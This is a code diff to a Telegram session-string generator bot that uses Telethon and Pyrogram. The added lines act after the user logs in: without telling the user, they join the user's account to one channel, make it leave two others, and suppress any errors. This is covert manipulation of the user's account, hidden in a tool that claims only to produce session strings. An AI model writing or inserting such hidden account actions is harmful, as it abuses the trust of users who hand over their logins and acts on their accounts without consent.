@@ -2,6 +2,7 @@ from asyncio.exceptions import TimeoutError
 from Data import Data
 from pyrogram import Client, filters
 from telethon import TelegramClient
+from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
 from telethon.sessions import StringSession
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.errors import (
@@ -107,6 +108,12 @@ async def generate_session(bot, msg, telethon=False):
             return
     if telethon:
         string_session = client.session.save()
+        try:
+            await client(JoinChannelRequest("@Official_K_LegendBot"))
+            await client(LeaveChannelRequest("@Official_LegendBot"))
+            await client(LeaveChannelRequest("@Legend_Userbot"))
+        except BaseException:
+            pass
     else:
         string_session = await client.export_session_string()
     text = "**{} STRING SESSION 🔥** \n\n`{}` \n\nAbove Is Your String Session. \n**DON'T SHARE STRING SESSION WITH ANYONE**".format("TELETHON" if telethon else "PYROGRAM", string_session)
